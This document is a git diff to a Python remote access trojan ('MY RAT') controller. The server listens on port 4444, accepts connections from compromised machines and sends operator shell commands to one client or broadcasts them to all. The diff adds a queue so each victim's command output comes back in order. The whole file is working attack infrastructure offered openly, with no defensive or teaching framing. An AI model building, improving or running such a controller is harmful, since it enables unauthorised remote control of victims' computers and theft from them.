@@ -3,6 +3,7 @@ import threading
 import os
 from colorama import Fore
 import ctypes
+import queue
 
 clients = {}
 shutdown = False 
@@ -27,17 +28,18 @@ E::::::::::::::::::::E        tt:::::::::::tth:::::h     h:::::hR::::::R     R::
 EEEEEEEEEEEEEEEEEEEEEE          ttttttttttt  hhhhhhh     hhhhhhhRRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT
     """ + Fore.RESET)
 
-def handle_client(client_socket, addr):
+def handle_client(client_socket, addr, response_queue):
     clients[addr] = client_socket
     if os.name == "nt":
         ctypes.windll.kernel32.SetConsoleTitleW(f"MY RAT | CONNECTED CLIENTS: {len(clients)}")
 
-    while not shutdown: 
+    while not shutdown:
         try:
             response = client_socket.recv(4096).decode()
-            if not response:
+            if response:
+                response_queue.put((addr, response))  # Put the response in the queue
+            else:
                 break
-            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
         except (ConnectionResetError, BrokenPipeError, OSError):
             break
 
@@ -46,12 +48,12 @@ def handle_client(client_socket, addr):
     if addr in clients:
         del clients[addr]
 
-def accept_clients(server):
-    while not shutdown: 
+def accept_clients(server, response_queue):
+    while not shutdown:
         try:
             client_socket, addr = server.accept()
             print(f"\n{Fore.GREEN}[+]{Fore.RESET} New connection from {addr[0]}:{addr[1]}")
-            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
+            threading.Thread(target=handle_client, args=(client_socket, addr, response_queue), daemon=True).start()
         except OSError as e:
             if not shutdown:
                 print(f"Error accepting new client: {e}")
@@ -64,7 +66,8 @@ def start_server(host="0.0.0.0", port=4444):
     server.bind((host, port))
     server.listen(5)
 
-    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
+    response_queue = queue.Queue()  # Create a thread-safe queue
+    threading.Thread(target=accept_clients, args=(server, response_queue), daemon=True).start()
     os.system("cls" if os.name == "nt" else "clear")
     logo()
     print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {host}:{port}")
@@ -73,7 +76,7 @@ def start_server(host="0.0.0.0", port=4444):
     while True:
         if not clients:
             continue
-        
+
         print("\n[Connected Clients]")
         for idx, addr in enumerate(clients.keys(), start=1):
             print(f"{idx}. {addr[0]}:{addr[1]}")
@@ -82,22 +85,23 @@ def start_server(host="0.0.0.0", port=4444):
             choice = input("Select client number (or 0 to broadcast): ")
             if choice.lower() == "exit":
                 print(f"[{Fore.YELLOW}*{Fore.RESET}] Shutting down server...")
-                shutdown = True  
-                server.close() 
+                shutdown = True
+                server.close()
                 for client in clients.values():
-                    client.close() 
+                    client.close()
                 print(f"[{Fore.GREEN}+{Fore.RESET}] Server closed.")
                 break
             elif choice.lower() == "list":
                 print("\n[Connected Clients]")
                 for idx, addr in enumerate(clients.keys(), start=1):
                     print(f"{idx}. {addr[0]}:{addr[1]}")
-                continue 
+                continue
             else:
                 choice = int(choice) - 1
         except ValueError:
             print(f"[{Fore.RED}!{Fore.RESET}] Invalid input. Please enter a number, 'exit', or 'list'.")
             continue
+
 
         if choice == -1:
             while True:
@@ -105,17 +109,36 @@ def start_server(host="0.0.0.0", port=4444):
                 if command.lower() == "back":
                     print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
                     break
+                
+                # Send the command to all clients
                 for client in clients.values():
                     client.send(command.encode())
+
+                # Wait for responses from all clients
+                responses_received = 0
+                while responses_received < len(clients):
+                    try:
+                        addr, response = response_queue.get(timeout=15)
+                        print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
+                        responses_received += 1
+                    except queue.Empty:
+                        print(f"\n{Fore.RED}[!]{Fore.RESET} Timeout waiting for responses from some clients.")
+                        break
         elif 0 <= choice < len(clients):
             target_addr = list(clients.keys())[choice]
-            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interracting with {target_addr[0]}")
+            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interacting with {target_addr[0]}")
+            
             while True:
                 command = input(f"{target_addr[0]}> ")
                 if command.lower() == "back":
                     print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
                     break
                 clients[target_addr].send(command.encode())
+                try:
+                    addr, response = response_queue.get(timeout=15)
+                    print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
+                except queue.Empty:
+                    print(f"\n{Fore.RED}[!]{Fore.RESET} No response from client {target_addr[0]}")
         else:
             print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")
 
